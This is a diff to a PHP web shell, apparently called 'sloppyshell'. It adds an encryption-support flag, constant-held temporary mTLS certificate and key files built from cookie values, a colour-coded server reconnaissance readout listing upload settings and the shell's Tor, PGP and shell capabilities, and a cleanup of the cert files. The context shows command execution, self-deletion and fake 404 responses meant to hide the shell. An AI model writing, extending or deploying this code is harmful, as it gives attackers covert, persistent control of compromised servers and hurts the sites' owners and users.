@@ -17,6 +17,14 @@ if (!defined('allowed_chars')) {
     define("allowed_chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKMNOPQRSTUVWXYZ");
 }
 
+if (function_exists("sodium_crypto_aead_chacha20poly1305_decrypt") && function_exists("sodium_crypto_aead_chacha20poly1305_encrypt")){
+    if (!defined("slopEncryption")){
+        define("slopEncryption", true);
+    }else{
+        define("slopEncryption", false);
+    }
+}
+
 if (!defined("os")){
     define("slopos", strtoupper(substr(PHP_OS, 0, 3)));
 }
@@ -71,14 +79,14 @@ if (function_exists("stream_context_create") && function_exists("stream_socket_s
         define("slopMTLS", true);
         $server_key = $_COOKIE['cck'];
         $server_cert = $_COOKIE['ppc'];
-        $temp_cert_p = tempnam(sys_get_temp_dir(), bin2hex(random_bytes(random_int(25, 50))));
-        $temp_key_p = tempnam(sys_get_temp_dir(), bin2hex(random_bytes(random_int(25, 50))));
-        file_put_contents($temp_cert_p, $server_cert);
-        file_put_contents($temp_key_p, $server_key);
+        define("temp_cert_p", tempnam(sys_get_temp_dir(), bin2hex(random_bytes(random_int(25, 50)))));
+        define("temp_key_p", tempnam(sys_get_temp_dir(), bin2hex(random_bytes(random_int(25, 50)))));
+        file_put_contents(temp_cert_p, $server_cert);
+        file_put_contents(temp_key_p, $server_key);
         mkdir(sprintf("%s/.crypto", scache));
         define("ctx", stream_context_create([
-            "local_cert" => $temp_cert_p,
-            "local_pk" => $temp_key_p,
+            "local_cert" => temp_cert_p,
+            "local_pk" => temp_key_p,
             "verify_peer" => true,
             "verify_peer_name" => false
         ]));
@@ -337,6 +345,13 @@ function executeCommands($command)
     return "No functions for code execution can be used.";
 }
 
+function cleanupCerts()
+{
+    if (defined("slopMTLS") && slopMTLS === true){
+        unlink(temp_key_p);
+        unlink(temp_cert_p);
+    }
+}
 
 function slopp()
 {
@@ -445,12 +460,21 @@ function slopp()
                         header("X-Success: 1");
                         break;
                     case "cqI":
-                        $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads") : "cannot set max_file_uploads";
-                        $sfem = ini_get("safe_mode") ? "set to true" : "cannot set safemode.";
-                        $fups = ini_get("file_uploads") ? "true" : "false";
-                        $maxium_size = ini_get("upload_max_filesize") ? ini_get("upload_max_filesize") : "cannot set fileupload size.";
-                        $ftd = ini_get("upload_tmp_dir") ? ini_get("upload_tmp_dir") : "cannot set upload_tmp_dir";
+                        $fsize = ini_get("max_file_uploads") ? "\033[0;32m".ini_get("max_file_uploads")."\033[0m" : "\033[0;31mcannot set max_file_uploads\033[0m";
+                        $sfem = ini_get("safe_mode") ? "\033[0;32mset to true\033[0m" : "\033[0;31mcannot set safemode.\033[0m";
+                        $fups = ini_get("file_uploads") ? "\033[0;32mtrue\033[0m": "\033[0;31mfalse\033[0m";
+                        $maxium_size = ini_get("upload_max_filesize") ? "\033[0;32m".ini_get("upload_max_filesize")."\033[0m" : "\033[0;31mcannot set fileupload size.\033[0m";
+                        $ftd = ini_get("upload_tmp_dir") ? "\033[0;32m".ini_get("upload_tmp_dir")."\033[0m" : "\033[0;31mcannot set upload_tmp_dir\033[0m";
                         $incp = get_include_path();
+                        $slopDefines = implode(PHP_EOL, [
+                            sprintf("slopMTLS: %s", slopMTLS ? "\033[0;32mtrue\033[0m": "\033[0;31mfalse\033[0m"),
+                            sprintf("slopEncryption: %s", slopEncryption ? "\033[0;32mtrue\033[0m": "\033[0;31mfalse\033[0m"),
+                            sprintf("slopOS: %s", slopos ? "\033[0;32mtrue\033[0m": "\033[0;31mfalse\033[0m"),
+                            sprintf("slopShell: %s", sloppyshell ? "\033[0;32mtrue\033[0m": "\033[0;31mfalse\033[0m"),
+                            sprintf("slopTor: %s", slopTor ? "\033[0;32mtrue\033[0m": "\033[0;31mfalse\033[0m"),
+                            sprintf("slopPGP: %s", slopPGP ? "\033[0;32mtrue\033[0m": "\033[0;31mfalse\033[0m"),
+                            sprintf(".scache full path: %s", scache)
+                        ]);
                         echo <<<INI
 Max file uploads: $fsize
 Safemode: $sfem
@@ -458,6 +482,8 @@ File_Uploads: $fups
 Upload Temp Dir: $ftd
 Maximum File upload size: $maxium_size
 Include Path: $incp
+---------------- SLOP DEFINES ---------------------
+$slopDefines
 INI. PHP_EOL;
                         header("X-Success: 1");
                         break;
@@ -475,10 +501,12 @@ INI. PHP_EOL;
         }
         unlink($_SERVER['SCRIPT_FILENAME']);
         http_response_code(404);
+        cleanupCerts();
         die();
     }else {
         http_response_code(404);
         header("File Not Found");
+        cleanupCerts();
         die();
     }
 }
